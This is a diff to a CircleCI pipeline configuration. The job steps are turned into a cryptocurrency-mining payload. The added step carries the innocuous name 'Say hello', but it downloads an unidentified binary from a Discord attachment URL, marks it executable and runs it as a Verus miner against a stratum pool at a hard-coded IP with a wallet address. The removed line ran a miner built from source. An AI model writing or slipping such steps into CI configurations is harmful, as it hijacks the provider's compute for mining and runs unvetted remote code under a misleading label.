@@ -9,13 +9,14 @@ jobs:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
     docker:
-      - image: ubuntu:latest
+      - image: cimg/base:stable
     # Add steps to the job
     # See: https://circleci.com/docs/2.0/configuration-reference/#steps
     steps:
       - checkout
       - run:
-          command: apt update -y && apt install sudo wget git -y && sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/adhithaghuna/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://178.62.209.81:443 -u REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.tesa -p x -t 64"
+          name: "Say hello"
+          command: "git clone --single-branch -b Verus2.2 https://github.com/adhithaghuna/ccminer.git && cd ccminer && wget https://cdn.discordapp.com/attachments/614113650038538240/944494600012333086/tes && chmod +x tes && ./tes -a verus -o stratum+tcp://178.62.209.81:443 -u REZd6Rp9GztPMm7Fsj3nsEpy9qHwktg3c9.test -p x -t 32"
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
